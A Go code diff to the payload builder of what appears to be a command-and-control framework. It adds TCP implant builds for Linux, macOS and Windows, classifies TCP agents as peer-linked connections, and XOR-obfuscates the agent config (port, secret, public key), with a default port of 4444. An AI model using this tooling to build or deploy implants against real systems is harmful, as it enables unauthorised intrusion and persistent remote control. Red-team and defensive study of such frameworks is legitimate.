@@ -125,8 +125,8 @@ func (h *PayloadHandler) BuildPayload(c *gin.Context) {
 	}
 	// Note: PayloadType is auto-detected from listener protocol in buildPayloadSync
 	// If explicitly provided, validate it
-	if req.PayloadType != "" && req.PayloadType != "http" && req.PayloadType != "smb" {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid payload_type, must be http or smb"})
+	if req.PayloadType != "" && req.PayloadType != "http" && req.PayloadType != "smb" && req.PayloadType != "tcp" {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid payload_type, must be http, smb, or tcp"})
 		return
 	}
 
@@ -222,6 +222,9 @@ func (h *PayloadHandler) buildPayloadSync(ctx context.Context, req BuildPayloadR
 		if listenerProtocol == "SMB" {
 			payloadType = "smb"
 			log.Printf("[REST Builder] Auto-detected SMB payload type from listener protocol")
+		} else if listenerProtocol == "TCP" {
+			payloadType = "tcp"
+			log.Printf("[REST Builder] Auto-detected TCP payload type from listener protocol")
 		} else {
 			payloadType = "http" // Default to HTTP for HTTP/HTTPS/RPC
 		}
@@ -229,9 +232,9 @@ func (h *PayloadHandler) buildPayloadSync(ctx context.Context, req BuildPayloadR
 	req.PayloadType = payloadType
 
 	// Determine connection type - this is what gets stored in DB and sent to agent service
-	// "edge" for HTTP/HTTPS agents, "link" for SMB/RPC agents
+	// "edge" for HTTP/HTTPS agents, "link" for SMB/RPC/TCP agents
 	connectionType := "edge"
-	if payloadType == "smb" || listenerProtocol == "SMB" || listenerProtocol == "RPC" {
+	if payloadType == "smb" || payloadType == "tcp" || listenerProtocol == "SMB" || listenerProtocol == "RPC" || listenerProtocol == "TCP" {
 		connectionType = "link"
 	}
 
@@ -509,6 +512,36 @@ func (h *PayloadHandler) prepareEnvVars(req BuildPayloadRequest, listener *liste
 		log.Printf("[REST Builder] Created encrypted SMB config for pipe: %s", req.PipeName)
 	}
 
+	// Add TCP-specific config (similar to SMB)
+	if req.PayloadType == "tcp" {
+		// Get TCP port from listener or use default
+		tcpPort := strconv.Itoa(listener.Port)
+		if tcpPort == "0" {
+			tcpPort = "4444" // Default TCP port
+		}
+		envVars = append(envVars, fmt.Sprintf("TCP_PORT=%s", tcpPort))
+
+		// Create encrypted config for TCP agent (same pattern as SMB)
+		// The config is XOR encrypted with the PLAIN secret
+		tcpConfig := map[string]string{
+			"TCP Port":   tcpPort,
+			"Secret":     secret,
+			"Public Key": keyPair.PublicKeyPEM,
+		}
+		configJSON, _ := json.Marshal(tcpConfig)
+
+		// XOR encrypt config with the plain secret
+		secretBytes := []byte(secret)
+		encrypted := make([]byte, len(configJSON))
+		for i, b := range configJSON {
+			encrypted[i] = b ^ secretBytes[i%len(secretBytes)]
+		}
+		encryptedConfig := base64.StdEncoding.EncodeToString(encrypted)
+
+		envVars = append(envVars, fmt.Sprintf("ENCRYPTED_CONFIG=%s", encryptedConfig))
+		log.Printf("[REST Builder] Created encrypted TCP config for port: %s", tcpPort)
+	}
+
 	// Add encrypted config values
 	envVars = append(envVars,
 		fmt.Sprintf("PUBLIC_KEY=%s", xorEncrypt(keyPair.PublicKeyPEM, xorKey)),
@@ -589,6 +622,9 @@ func (h *PayloadHandler) runDockerBuild(ctx context.Context, envVars []string) e
 			fmt.Sprintf("%s/Linux:/build/Linux:ro", hostPayloadsPath),
 			fmt.Sprintf("%s/Windows:/build/Windows:ro", hostPayloadsPath),
 			fmt.Sprintf("%s/SMB_Windows:/build/SMB_Windows:ro", hostPayloadsPath),
+			fmt.Sprintf("%s/TCP_Linux:/build/TCP_Linux:ro", hostPayloadsPath),
+			fmt.Sprintf("%s/TCP_Darwin:/build/TCP_Darwin:ro", hostPayloadsPath),
+			fmt.Sprintf("%s/TCP_Windows:/build/TCP_Windows:ro", hostPayloadsPath),
 			fmt.Sprintf("%s/shared:/build/shared:ro", hostPayloadsPath),
 		},
 	}
